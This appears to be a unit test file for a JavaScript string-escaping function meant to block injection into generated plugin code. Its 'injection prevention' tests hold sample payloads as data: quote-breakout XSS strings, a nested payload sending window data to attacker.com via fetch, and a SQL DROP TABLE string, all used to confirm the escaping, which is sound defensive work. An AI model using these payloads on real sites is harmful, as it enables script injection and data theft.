/**
 * Unit tests for JavaScript string escaping function
 * Tests the escapeJavaScriptString() function used in plugin download
 * to prevent JavaScript injection attacks
 */

import { describe, it, expect } from 'vitest';

// Import the ACTUAL production function from shared module
import { escapeJavaScriptString } from '../src/escapeUtils.js';

describe('escapeJavaScriptString', () => {
  describe('basic escaping', () => {
    it('should escape single quotes', () => {
      const input = "It's a test";
      const output = escapeJavaScriptString(input);
      expect(output).toBe("It\\'s a test");
    });

    it('should escape double quotes', () => {
      const input = 'Say "hello"';
      const output = escapeJavaScriptString(input);
      expect(output).toBe('Say \\"hello\\"');
    });

    it('should escape backticks', () => {
      const input = 'Template `literal`';
      const output = escapeJavaScriptString(input);
      expect(output).toBe('Template \\`literal\\`');
    });

    it('should escape backslashes', () => {
      const input = 'C:\\Users\\Admin';
      const output = escapeJavaScriptString(input);
      expect(output).toBe('C:\\\\Users\\\\Admin');
    });

    it('should escape newlines', () => {
      const input = 'Line1\nLine2';
      const output = escapeJavaScriptString(input);
      expect(output).toBe('Line1\\nLine2');
    });

    it('should escape carriage returns', () => {
      const input = 'Line1\r\nLine2';
      const output = escapeJavaScriptString(input);
      expect(output).toBe('Line1\\r\\nLine2');
    });

    it('should escape tabs', () => {
      const input = 'Col1\tCol2';
      const output = escapeJavaScriptString(input);
      expect(output).toBe('Col1\\tCol2');
    });

    it('should escape Unicode line separators', () => {
      const input = 'Line\u2028Separator\u2029Paragraph';
      const output = escapeJavaScriptString(input);
      expect(output).toBe('Line\\u2028Separator\\u2029Paragraph');
    });
  });

  describe('injection prevention', () => {
    it('should neutralize single quote injection payload', () => {
      const injection = "'; alert('XSS'); var x='";
      const escaped = escapeJavaScriptString(injection);

      // Verify quotes are escaped (\ followed by ')
      expect(escaped).toContain("\\'");

      // Verify the critical part: quote is now escaped so it can't break out of string
      // In escaped form, the ' is preceded by \ making it a literal quote, not code
      expect(escaped).toBe("\\'; alert(\\'XSS\\'); var x=\\'");
    });

    it('should neutralize double quote injection payload', () => {
      const injection = '"; alert("XSS"); var x="';
      const escaped = escapeJavaScriptString(injection);

      // Verify double quotes are escaped
      expect(escaped).toContain('\\"');
      expect(escaped).toBe('\\"; alert(\\"XSS\\"); var x=\\"');
    });

    it('should neutralize template literal injection payload', () => {
      const injection = '`; alert(`XSS`); var x=`';
      const escaped = escapeJavaScriptString(injection);

      // Verify backticks are escaped
      expect(escaped).toContain('\\`');
      expect(escaped).toBe('\\`; alert(\\`XSS\\`); var x=\\`');
    });

    it('should neutralize multiline injection payload', () => {
      const injection = "'\n}; alert('XSS'); const fake = {a: '";
      const escaped = escapeJavaScriptString(injection);

      // Verify newline is escaped to \n literal
      expect(escaped).toContain('\\n');
      expect(escaped).toContain("\\'");
      // The escaped string should not contain actual newline character
      expect(escaped.includes('\n')).toBe(false);
    });

    it('should handle complex nested injection', () => {
      const injection = "https://evil.com'; } // end\nconst STOLEN = window; fetch('https://attacker.com', {body: JSON.stringify(STOLEN)}); const fake = { url: '";
      const escaped = escapeJavaScriptString(injection);

      // All dangerous characters should be escaped
      // The actual newline should be converted to \n literal
      expect(escaped.includes('\n')).toBe(false);
      expect(escaped).toContain('\\n');
      expect(escaped).toContain("\\'");
    });

    it('should handle backslash followed by quote (escape bypass attempt)', () => {
      // Attack: \\' would become \\\' after naive escaping, but should be \\\\\'
      const injection = "\\'";
      const escaped = escapeJavaScriptString(injection);

      // Should escape backslash first, then quote
      expect(escaped).toBe("\\\\\\'");
    });
  });

  describe('edge cases', () => {
    it('should handle empty string', () => {
      expect(escapeJavaScriptString('')).toBe('');
    });

    it('should handle string with only special characters', () => {
      const input = "'\"\`\n\r\t\\";
      const output = escapeJavaScriptString(input);
      expect(output).toBe("\\'\\\"\\`\\n\\r\\t\\\\");
    });

    it('should handle very long strings', () => {
      const input = "test'".repeat(10000);
      const output = escapeJavaScriptString(input);
      expect(output.length).toBe(60000); // Each ' becomes \' (2 chars)
    });

    it('should handle Unicode characters', () => {
      const input = "Zażółć 'gęślą' jaźń";
      const output = escapeJavaScriptString(input);
      expect(output).toBe("Zażółć \\'gęślą\\' jaźń");
    });

    it('should handle URL with special characters', () => {
      const input = "https://example.com/path?query='value'&other=\"test\"";
      const output = escapeJavaScriptString(input);
      expect(output).toBe("https://example.com/path?query=\\'value\\'&other=\\\"test\\\"");
    });
  });

  describe('JavaScript syntax safety', () => {
    it('should produce valid JavaScript when used in string literal', () => {
      const testCases = [
        "normal text",
        "text with 'quotes'",
        "text with \"double quotes\"",
        "text with `backticks`",
        "text\nwith\nnewlines",
        "path\\to\\file",
        "'; DROP TABLE users; --",
      ];

      for (const testCase of testCases) {
        const escaped = escapeJavaScriptString(testCase);
        const code = `const x = '${escaped}';`;

        // This should not throw - valid JavaScript syntax
        expect(() => {
          new Function(code);
        }).not.toThrow();
      }
    });
  });
});
